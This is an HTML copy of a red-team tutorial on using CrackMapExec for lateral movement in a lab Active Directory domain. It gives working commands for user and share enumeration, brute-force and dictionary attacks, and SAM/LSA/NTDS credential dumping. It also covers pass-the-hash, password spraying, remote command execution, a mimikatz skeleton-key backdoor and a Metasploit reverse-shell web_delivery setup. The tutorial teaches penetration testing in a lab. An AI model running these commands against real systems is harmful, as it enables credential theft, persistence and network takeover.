@@ -1,0 +1,249 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/" rel="category tag">Lateral Movement</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Lateral Movement on Active Directory: CrackMapExec</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/" rel="bookmark"><time class="entry-date published" datetime="2020-05-07T14:05:35+00:00">May 7, 2020</time><time class="updated" datetime="2025-05-15T08:58:07+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we learn to use crackmapexec. This tool is developed by byt3bl33d3r. I have used this tool many times for both offensive and defensive techniques. And with my experience from this tool, I can say that the tool is so amazing that one can use it for situational awareness as well as lateral movement. You can download the tool from <a style="color: #000000;" href="https://github.com/byt3bl33d3r/CrackMapExec">here</a>.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Introduction to Crackmapexec</strong></span></li>
+<li><span style="color: #000000;"><strong>Crackmapexec and Red Team</strong></span></li>
+<li><span style="color: #000000;"><strong>Configurations Used for Practical</strong></span></li>
+<li><span style="color: #000000;"><strong>Installation</strong></span></li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Discovering IPs</span></li>
+<li><span style="color: #000000;">users</span></li>
+<li><span style="color: #000000;">groups</span></li>
+<li><span style="color: #000000;">txt files</span></li>
+<li><span style="color: #000000;">log files</span></li>
+<li><span style="color: #000000;">share</span></li>
+<li><span style="color: #000000;">sessions</span></li>
+<li><span style="color: #000000;">password policies</span></li>
+<li><span style="color: #000000;">Drives</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Bruteforce </strong></span></li>
+<li><span style="color: #000000;"><strong>Dictionary Attack</strong></span></li>
+<li><span style="color: #000000;"><strong>Credential Dumping</strong></span>
+<ul>
+<li><span style="color: #000000;">SAM</span></li>
+<li><span style="color: #000000;">LSA</span></li>
+<li><span style="color: #000000;">NTDS (DRSUAPI)<br/>
+</span></li>
+<li>NTDS (VSS)</li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Pass the Hash</strong></span></li>
+<li><span style="color: #000000;"><strong>Password spraying</strong></span></li>
+<li><span style="color: #000000;"><strong>Remote Command Execution</strong></span>
+<ul>
+<li><span style="color: #000000;">wmiexec</span></li>
+<li><span style="color: #000000;">atexec</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Modules </strong></span>
+<ul>
+<li><span style="color: #000000;">mimikatz</span></li>
+<li><span style="color: #000000;">wdigest</span></li>
+<li><span style="color: #000000;">enum_dns</span></li>
+<li><span style="color: #000000;">Web delivery</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Introduction to Crackmapexec</span></h3>
+<p><span style="color: #000000;">Crackmapexec, also known as CME, is a post-exploitation tool. The developer of the tool describes it as a “swiss army knife for pen-testing networks”, which I find is an apt description. The tool is developed in python and lets us move laterally in an environment while being situationally aware. It abuses the Active Directory security by gathering all the information from IP addresses to harvesting the credentials from SAM. And this is the only information we need for our lateral movement. It also offers us numerous modules such as mimikatz, web delivery, wdigest, etc. to make dumping of credentials and getting a session easy. Hence, making an attacker all-powerful by letting them living off the Land.</span></p>
+<h3><span style="color: #800000;">Configurations Used for Practical</span></h3>
+<ul>
+<li><span style="color: #000000;">Target: Windows Server 2016</span></li>
+<li><span style="color: #000000;">Attacker: Kali Linux 2020.1</span></li>
+</ul>
+<p><span style="color: #000000;">Here, in our lab scenario, we have configured the following settings on our systems.</span></p>
+<h3><span style="color: #000000;"><strong>Windows Server Details</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Domain: ignite.local</span></li>
+<li><span style="color: #000000;">User: Administrator</span></li>
+<li><span style="color: #000000;">Password: Ignite@987</span></li>
+<li><span style="color: #000000;">IP Address: 192.168.1.105</span></li>
+</ul>
+<h3><span style="color: #000000;"><strong>Windows Client Details</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">OS: Windows 10</span></li>
+<li><span style="color: #000000;">IP Address: 192.168.1.106</span></li>
+<li><span style="color: #000000;">Users: kavish, geet, aarti, yashika</span></li>
+<li><span style="color: #000000;">Password: Password@1</span></li>
+</ul>
+<h3><span style="color: #800000;">Installation</span></h3>
+<p><span style="color: #000000;">The installation for this tool is most simple as for installation just use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install crackmapexec</pre>
+<p><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/--zMw2rZU9b0/XrQGo1JS0-I/AAAAAAAAj6M/wmcfEIyzKe8nKWuMr3KBSAJeg-5zvBOAACLcBGAsYHQ/s1600/1.png" alt=" Lateral Movement using CrackMapExec" width="533" height="321"/></p>
+<p><span style="color: #000000;">Note: if the above command gives any issue then we recommend you to perform an apt update and upgrade on your Kali.</span></p>
+<h3><span style="color: #800000;">Enumeration: Discovering IPs</span></h3>
+<p><span style="color: #000000;">To discover the IPs on the target network, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.0/24</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-liXarr_G7is/XrQGs5nUHPI/AAAAAAAAj64/Fhu4MZ3kSSozBS8YTHz6JuHGzFpLuwz2wCLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;">And as shown in the image above, you will have the list of the IPs.</span></p>
+<p><span style="color: #000000;">In a general sense, the syntax for crackmapexec is:</span></p>
+<p><span style="color: #000000;"><strong>crackmapexec &lt;protocol&gt; &lt;Target_IP&gt; -u ‘&lt;username&gt;‘ -p ‘&lt;passwprd&gt;‘</strong></span></p>
+<p><span style="color: #000000;">Which will bring out the command to be:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987'</pre>
+<h3><img decoding="async" src="https://1.bp.blogspot.com/-_DgnnY1JuiQ/XrQGw3a6Z_I/AAAAAAAAj7k/c0hSZeRtgco1FKsHXVKaL0lj-4zq-W1fwCLcBGAsYHQ/s1600/3.png"/></h3>
+<h3><span style="color: #800000;">Enumeration: Users</span></h3>
+<p><span style="color: #000000;">To find out all the lists of the users in your target system, we will use the ‘—user’ parameter. Hence, the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --users</pre>
+<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-PuYmvHABPtg/XrQGzn9v10I/AAAAAAAAj8I/93n1_333sz4OrHxRp9W9DBR3JoYzuopDQCLcBGAsYHQ/s1600/4.png" alt=" Lateral Movement using CrackMapExec" width="854" height="548"/></p>
+<p><span style="color: #000000;">As shown in the above image, the execution of the above command will show the users of the target system.</span></p>
+<h3><span style="color: #800000;">Enumeration: Groups</span></h3>
+<p><span style="color: #000000;">To get the details of the groups from the target system, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --groups</pre>
+<h3><img decoding="async" src="https://1.bp.blogspot.com/-gGM5wo4iXyI/XrQGz3ooPyI/AAAAAAAAj8E/pWyBkhcO2l0H20MpYfR6nKe5mseiOwcmgCLcBGAsYHQ/s1600/5.png"/></h3>
+<h3><span style="color: #800000;">Enumeration: Text files</span></h3>
+<p><span style="color: #000000;">To get all the information of the text files in the target system, such as path, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --spider C\$ --pattern txt</pre>
+<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-CdjeMppTEc8/XrQG0NuUQeI/AAAAAAAAj8M/m4immECubkYa2_mrggt6qhQ-vCPQZGYDQCLcBGAsYHQ/s1600/6.png" alt=" Lateral Movement using CrackMapExec" width="1170" height="349"/></p>
+<h3><span style="color: #800000;">Enumeration: Log Files</span></h3>
+<p><span style="color: #000000;">Similarly, to retrieve the information of log files from the target system, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --spider C\$ --pattern log</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-sFCv_q1k9KQ/XrQG01wHa8I/AAAAAAAAj8Q/HVU1TwWVLO4nHAclfqmYS9X6h4hZIHe1ACLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">This way you can access the information on any file extension such as exe, etc.</span></p>
+<h3><span style="color: #800000;">Enumeration: Shares</span></h3>
+<p><span style="color: #000000;">To know what folders are shared among the network and what permissions they have, we can use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --shares</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-iZOytmM-LLo/XrQG1SD28II/AAAAAAAAj8U/VHGIaX0d9q8a-dtLZFzMAuePTO-IvgbwgCLcBGAsYHQ/s1600/8.png" alt=" Lateral Movement using CrackMapExec" width="828" height="210"/></p>
+<p><span style="color: #000000;">As shown in the image above, we will have all the information for share folders in the network.</span></p>
+<h3><span style="color: #800000;">Enumeration: Sessions</span></h3>
+<p><span style="color: #000000;">The active sessions details can be found from the command given below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sessions</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-dXONIW8OltU/XrQG1YRn7oI/AAAAAAAAj8Y/LH06SfOKIFAAfzuIBjDCxTqo_qydlOOeACLcBGAsYHQ/s1600/9.png"/></p>
+<h3><span style="color: #800000;">Enumeration: Password Policies</span></h3>
+<p><span style="color: #000000;">To know the password policies that have been applied in the target system, CME provides us with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --pass-pol</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-H_PTxk6zz7o/XrQGpCpYg7I/AAAAAAAAj6U/SaKd8QTkNCglK3WZc3hf7hqdRgLlNRRigCLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">Executing the above command will give us the details of the password policies as shown in the image above.</span></p>
+<h3><span style="color: #800000;">Enumeration: Drives</span></h3>
+<p><span style="color: #000000;">To find out how many drives are in the target system, with what names. We can use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --disks</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-WnLeXV0Vmeo/XrQGo8eH7II/AAAAAAAAj6Q/WmYEGEDqNPMADe3SX0vrcDu-Gvex-PArgCLcBGAsYHQ/s1600/11.png" alt=" Lateral Movement using CrackMapExec" width="824" height="103"/></p>
+<h3><span style="color: #800000;">Bruteforce: Username</span></h3>
+<p><span style="color: #000000;">With crackmapexec, you can also brute force the username that will match our correct password. We will be doing this on the whole network, that is why we will specify the IP range instead of just giving IP. We will do this, with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.0/24 -u "kavish" "Administrator" -p "Ignite@987"</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-g6Zu6RybdoI/XrQGp3rOXwI/AAAAAAAAj6Y/j7cV6suVstANFYCAspwrvjRibtl5Ebk7gCLcBGAsYHQ/s1600/12.png"/></p>
+<h3><span style="color: #800000;">Bruteforce: Password</span></h3>
+<p><span style="color: #000000;">With CME, we can brute-force passwords on a single target system or the whole network. In our practice, we have a brute-forced password on the whole network. To do the said, type:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.0/24 -u "Administrator" -p "password1" "password2" "Ignite@987"</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-HWUcHBmwDS0/XrQGqSNCDKI/AAAAAAAAj6c/4YXlccZoxHsap6nwI3_piwJMGzjdOILyACLcBGAsYHQ/s1600/13.png" alt=" Lateral Movement using CrackMapExec" width="888" height="212"/></p>
+<h3><span style="color: #800000;">Dictionary Attack</span></h3>
+<p><span style="color: #000000;">CME also enable us to do dictionary on both username and password. Both custom or already made dictionaries can be given for the attack. In our practical, we have given a custom-made dictionary for both usernames and passwords. This attack can be done on the whole network or a single IP. We are doing this attack on the whole network as we are giving a whole IP range. To initiate the attack, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.0/24 -u /root/Desktop/user.txt -p /root/Desktop/pass.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ZMj3cATIy68/XrQGqhg9C_I/AAAAAAAAj6g/-Zdw1iPTreg1X0n3oRxmsDJ8z0jxuGtEwCLcBGAsYHQ/s1600/14.png"/></p>
+<h3><span style="color: #800000;">Credential Dumping: SAM</span></h3>
+<p><span style="color: #000000;">SAM is short for the Security Account Manager which manages all the user accounts and their passwords. It acts as a database. All the passwords are hashed and then stored SAM. Using CME, we will dump the credentials from SAM in the form of hashes by using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sam</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-quX62y19y_g/XrQGrOAW7xI/AAAAAAAAj6k/JVjX7W16W_8QkNzn7QaKucbm_JPTmV6eQCLcBGAsYHQ/s1600/15.png"/></p>
+<h3><span style="color: #800000;">Credential Dumping: LSA</span></h3>
+<p><span style="color: #000000;">The Local Security Authority (LSA) is a protected system process that authenticates and logs users on to the local computer. Domain credentials are used by the operating system and authenticated by the Local Security Authority (LSA). Therefore, LSA has access to the credentials and we will exploit this fact to harvest the credentials with CME by using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --lsa</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-pmN4Heo-IJQ/XrQGrY-al1I/AAAAAAAAj6o/SVlO9IbzI5Y2uzY91QJp0eGhm3dJ3VstgCLcBGAsYHQ/s1600/16.png" alt=" Lateral Movement using CrackMapExec" width="1127" height="193"/></p>
+<h3><span style="color: #800000;">Credential Dumping: NTDS (DRSUAPI)</span></h3>
+<p><span style="color: #000000;">NTDS stands for New Technologies Directory Services and DIT stands for Directory Information Tree. This file acts as a database for Active Directory and stores all its data including all the credentials. And so we will manipulate this file to dump the hashes by using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds drsuapi</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-8VJhHacT6KY/XrQGrh2dz-I/AAAAAAAAj6s/u5Nv-eJ2Ri0cMHA1FKRU_JzTgPPM54Y2ACLcBGAsYHQ/s1600/17.png"/></p>
+<h3><span style="color: #800000;">Credential Dumping: NTDS (VSS)</span></h3>
+<p><span style="color: #000000;">Another way to retrieve credentials from NTDS is through VSS i.e. the volume shadow copy. And for this method, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds vss</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-sGyrmYfNdwI/XrQGsHEcXjI/AAAAAAAAj6w/gpIQDj48VjYZYW7SHxdnnocCyhsrCo1dgCLcBGAsYHQ/s1600/18.png" alt=" Lateral Movement using CrackMapExec" width="1192" height="232"/></p>
+<h3><span style="color: #800000;">Pass the Hash</span></h3>
+<p><span style="color: #000000;">Once we have dumped hashes, we don’t need to use any other tool to pass the hash. With CME we need to use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-8phsScGz_hQ/XrQGsSKzs3I/AAAAAAAAj60/2lcXNrhXg70WSaoUWGbvCgldCspeYpHTgCLcBGAsYHQ/s1600/19.png"/></p>
+<h3><span style="color: #800000;">Password Spraying</span></h3>
+<p><span style="color: #000000;">Password Spraying is an attack where we get hold of accounts by using the same passwords for the same numerous usernames until we find a correct one. With CME, we can perform password spraying with two methods.  In the first method, we will use the parameter <strong>‘–rid-brute’. </strong>To use this parameter, the syntax will be:</span></p>
+<p><span style="color: #000000;"><strong>crackmapexec &lt;protocol&gt; &lt;IP Address&gt; -u &lt;path of username txt file&gt; -p ‘&lt;password&gt;‘ –rid-brute</strong></span></p>
+<p><span style="color: #000000;">Going by the above syntax, the command is:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.106 -u /root/Desktop/user.txt -p 'Password@1' --rid-brute</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ot4qhtDhIcc/XrQGsyzdo2I/AAAAAAAAj68/uwpZwKOgyi8xZloNWLWoBnya79vciRBpgCLcBGAsYHQ/s1600/20.png"/></p>
+<p><span style="color: #000000;">Another method for password spraying is by using the<strong> ‘–continue-on-success’</strong> and we will use this parameter with our custom-made dictionary that has all the usernames. The contents of the dictionary are shown in the image below using the <strong>cat</strong> command. And then for password spraying, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.106 -u /root/Desktop/user.txt -p 'Password@1' --continue-on-success</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-wtmsbmrTjiU/XrQGtZAw1VI/AAAAAAAAj7A/wmkrLPaB1UsQxjTckgxI7O6sPO9aiWcwgCLcBGAsYHQ/s1600/21.png"/></p>
+<h3><span style="color: #800000;">Remote Command Execution</span></h3>
+<p><span style="color: #000000;">Now that we have studied various ways to obtain the password, let now make use of it as CME allows us to remotely execute commands. We can use the quser command to get information about the users. And logoff command to log off the target system. The syntax for executing commands remotely is:</span></p>
+<p><span style="color: #000000;"><strong>crackmapexec &lt;protocol&gt; &lt;IP_Address&gt; -u ‘&lt;username&gt;‘ -p ‘&lt;password&gt;‘ -x ‘&lt;command&gt;‘</strong></span></p>
+<p><span style="color: #000000;">following the above syntax, our commands will be:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'quser'
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'logoff 2'</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-VYc4H6PExZw/XrQGtpaysPI/AAAAAAAAj7E/Ns8p0Bpn8c8IafhOQlgLVFLjQo27AOvAACLcBGAsYHQ/s1600/22.png" alt=" Lateral Movement using CrackMapExec" width="934" height="162"/></p>
+<p><span style="color: #000000;">And as you can see in the image above, our commands are successfully executed and we have the information.</span></p>
+<h3><span style="color: #800000;">Remote Command Execution: atexec</span></h3>
+<p><span style="color: #000000;">This command will execute the command with the help of the Task Scheduler service. For this, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'net user Administrator /domain' --exec-method atexec</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-phYJsWLq2oE/XrQGt1RcWQI/AAAAAAAAj7I/aviXr7wMqcot861P-P3Cb0S6buIe1MsgACLcBGAsYHQ/s1600/23.png"/></p>
+<p><span style="color: #000000;">And as you can see in the image above, our commands are successfully executed and we have the information.</span></p>
+<h3><span style="color: #800000;">Remote Command Execution: wmiexec</span></h3>
+<p><span style="color: #000000;">This command will execute the command with the help of the Windows Management Instrumentation (WMI) service. For this, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'net user Administrator /domain' --exec-method wmiexec</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-8hy-1rgfitE/XrQGuToq-KI/AAAAAAAAj7M/4hDZw288xNQJZOlY4gSM6_B_p9OuqJ93wCLcBGAsYHQ/s1600/24.png" alt=" Lateral Movement using CrackMapExec" width="773" height="462"/></p>
+<p><span style="color: #000000;">And as you can see in the image above, our commands are successfully executed and we have the information.</span></p>
+<p><span style="color: #000000;">We can also make the use of the PowerShell Cmdlets to execute tasks over the Remote using CME. This is possible due to the ability to execute commands remotely via WMI. For this use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -X '$PSVersionTable' --exec-method wmiexec</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-epHys3TuF_c/XrQGu5JGceI/AAAAAAAAj7Q/5yOoF2_d6E4tBPjqZS2qJOhqMTrl2LmswCLcBGAsYHQ/s1600/25.png"/></p>
+<p><span style="color: #000000;">And as you can see in the image above, our PowerShell Cmdlet is executed successfully and we have the information.</span></p>
+<p><span style="color: #000000;">Talking about WMI, we can also directly run the WMI command on the target using CME. The parameter ‘–wmi’ is designed for this purpose. We can provide it with the command string of WMI and it will execute it as shown in the image given below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --wmi "select Name from Win32_UserAccount"</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-AYWRZUoTCSo/XrQGvYmUrxI/AAAAAAAAj7Y/UL1ZvnnoiFQWNfRii6Hk2tgXEgVoLX_QACLcBGAsYHQ/s1600/26.png" alt=" Lateral Movement using CrackMapExec" width="1030" height="394"/></p>
+<p><span style="color: #000000;">And as we can see that we have a list of users on the target system which we extracted with the help of wmi command strings.</span></p>
+<h3><span style="color: #800000;">Modules</span></h3>
+<p><span style="color: #000000;">If from the above options you are not tempted to add CME in your tool kit, I bet the following will have you convinced in no time. CME also provides us with various modules which call upon the third-party tools like Mimikatz, Metasploit Framework, etc. to get the work done. To view all the modules that CME has to offer, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb -L</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-PAo4FYpaK8k/XrQGvWDeKNI/AAAAAAAAj7U/yRWL789mLhcZxz9iJ3ZIQjq4yHzKpZOGgCLcBGAsYHQ/s1600/27.png"/></p>
+<p><span style="color: #000000;">Just as shown in the image above, all the modules will be displayed after running the above command successfully. Now let’s take a few of the modules from this and see how we can use them.</span></p>
+<h3><span style="color: #800000;">Modules: mimikatz</span></h3>
+<p><span style="color: #000000;">First, we will run Mimikatz directly as a module without giving it any other argument. The syntax for this is as following:</span></p>
+<p><span style="color: #000000;"><strong>crackmapexec &lt;protocol&gt; &lt;IP Address&gt; -u &lt;path of username txt file&gt; -p ‘&lt;password&gt; -M &lt;module&gt;</strong></span></p>
+<p><span style="color: #000000;">Which will further make our command out to be as follows:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-jfPdoBb1CR0/XrQGv7xeVCI/AAAAAAAAj7c/oI1JYLk5swkFdXrG0CXe0_t4iaUJx515wCLcBGAsYHQ/s1600/28.png"/></p>
+<p><span style="color: #000000;">So now, as you can see in the image above, running the mimikatz module without any other argument will give the system credentials in the form of hashes.</span></p>
+<p><span style="color: #000000;">Now let’s try and give a mimikatz command as an argument, for doing so the command will be:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='privilege::debug'</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Ag2Y5MbwZRU/XrQGwqYOEeI/AAAAAAAAj7g/IW_ce8flVqcTnttWC7FLz2QbDVWjZrr8wCLcBGAsYHQ/s1600/29.png" alt=" Lateral Movement using CrackMapExec" width="1042" height="349"/></p>
+<p><span style="color: #000000;">And so, the command will debug all the privileges as shown in the image above. Now let’s try to run another command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='sekurlsa::logonPasswords'</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-axhLEXizV20/XrQGw0BAoHI/AAAAAAAAj7o/kI668kfmWSQNDGixofRY6ec3_w8TZTClgCLcBGAsYHQ/s1600/30.png"/></p>
+<p><span style="color: #000000;">Hence, running the above command will display all the hashes of the logon password. This way, you can also give further argument such as the argument to inject skeleton key with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='misc::skeleton'</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-hdSTfSouxgQ/XrQGxrQnekI/AAAAAAAAj7s/HpPL5SpXGBoOcFKzHt4FKucuHDT5oaPnwCLcBGAsYHQ/s1600/31.png" alt=" Lateral Movement using CrackMapExec" width="1010" height="392"/></p>
+<p><span style="color: #000000;">Now that we have successfully injected the skeleton in the memory of the Domain Controller. Now we can use various techniques to gain access to the Target machine.  </span></p>
+<p><span style="color: #000000;">Read More: </span><a href="https://www.hackingarticles.in/domain-controller-backdoor-skeleton-key/"><strong>Domain Controller Backdoor: Skeleton Key</strong></a></p>
+<h3><span style="color: #800000;">Module: Wdigest</span></h3>
+<p><span style="color: #000000;">Another module that CME presents us is wdigest. This module will create a registry key due to which passwords are stored in memory. To use this module, type the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M wdigest -o ACTION=enable</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-O5Qo7vpGo-c/XrQGxzZwdbI/AAAAAAAAj7w/7X3qfgH29VwQitDSVenaS22RpNS51eQGgCLcBGAsYHQ/s1600/32.png"/></p>
+<p><span style="color: #000000;">And as you can see in the image above, the registry key is created.</span></p>
+<h3><span style="color: #800000;">Module: enum_dns</span></h3>
+<p><span style="color: #000000;">This module harvests all the information about the target DNS and displays it on the console. To use this module, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M enum_dns</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-U274jtJZe_U/XrQGyO88III/AAAAAAAAj70/KsCOzlrZP2MTBb9EQOKnRKgN0PG-uYnpgCLcBGAsYHQ/s1600/33.png"/></p>
+<p><span style="color: #000000;">And as you can see in the image above all the information is dumped on the console.</span></p>
+<h3><span style="color: #800000;">Module: web_delivery</span></h3>
+<p><span style="color: #000000;">To this module, first open Metasploit Framework using the command ‘<strong>msfconsole’</strong> and then type the following set of commands to initiate web_delivery:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
+set target 2
+set payload windows/meterpreter/reverse_tcp
+set lhost &lt;local IP&gt;
+set srvhost &lt;local IP&gt;
+exploit</pre>
